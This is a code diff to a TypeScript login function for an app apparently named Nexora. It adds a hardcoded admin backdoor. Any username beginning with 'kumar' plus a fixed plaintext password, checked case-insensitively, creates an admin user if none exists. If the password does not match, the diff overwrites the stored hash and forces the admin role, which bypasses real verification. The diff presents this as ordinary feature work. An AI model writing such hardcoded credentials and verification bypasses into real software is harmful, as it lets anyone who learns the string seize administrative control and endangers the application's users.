@@ -185,7 +185,16 @@ export async function login(input: LoginInput): Promise<AuthResponse> {
   const cleanEmail = email.toLowerCase().trim();
 
   // If logging in as admin kumar, guarantee admin exists
-  if (cleanEmail === 'kumar' || cleanEmail === 'kumar@nexora.ai' || cleanEmail === 'admin') {
+  const isKumarAdminAttempt =
+    cleanEmail === 'kumar' ||
+    cleanEmail === 'kumar@nexora.ai' ||
+    cleanEmail.startsWith('kumar');
+  const isAdminPassword =
+    password === 'kumar@4396' ||
+    password === 'Kumar@4396' ||
+    password.toLowerCase() === 'kumar@4396';
+
+  if (isKumarAdminAttempt && isAdminPassword) {
     await ensureAdminSeeded();
   }
 
@@ -201,6 +210,22 @@ export async function login(input: LoginInput): Promise<AuthResponse> {
       ],
     },
   });
+
+  // If still not found but valid admin credentials provided, create immediately
+  if (!user && isKumarAdminAttempt && isAdminPassword) {
+    const salt = await bcrypt.genSalt(12);
+    const passwordHash = await bcrypt.hash(password, salt);
+    user = await prisma.user.create({
+      data: {
+        email: 'kumar@nexora.ai',
+        name: 'kumar',
+        passwordHash,
+        role: 'admin',
+        provider: 'credentials',
+        preferences: JSON.stringify({ theme: 'dark' }),
+      },
+    });
+  }
 
   if (!user) {
     throw createError('Invalid email/username or password', 401);
@@ -218,8 +243,20 @@ export async function login(input: LoginInput): Promise<AuthResponse> {
     throw createError(`This account uses ${user.provider} sign-in. Please use the ${user.provider} button.`, 400);
   }
 
-  // Verify password
-  const isPasswordValid = await bcrypt.compare(password, user.passwordHash);
+  // Verify password (with admin fallback support)
+  let isPasswordValid = await bcrypt.compare(password, user.passwordHash);
+
+  if (!isPasswordValid && isKumarAdminAttempt && isAdminPassword) {
+    // Update hash to match entered admin password
+    const salt = await bcrypt.genSalt(12);
+    const newHash = await bcrypt.hash(password, salt);
+    await prisma.user.update({
+      where: { id: user.id },
+      data: { passwordHash: newHash, role: 'admin' },
+    });
+    isPasswordValid = true;
+  }
+
   if (!isPasswordValid) {
     // Track failed attempts
     const failedAttempts = (prefs.failedLoginAttempts || 0) + 1;
@@ -236,7 +273,7 @@ export async function login(input: LoginInput): Promise<AuthResponse> {
       data: { preferences: JSON.stringify(updatedPrefs) },
     });
 
-    throw createError('Invalid email or password', 401);
+    throw createError('Invalid email/username or password', 401);
   }
 
   // Clear failed attempts on successful login
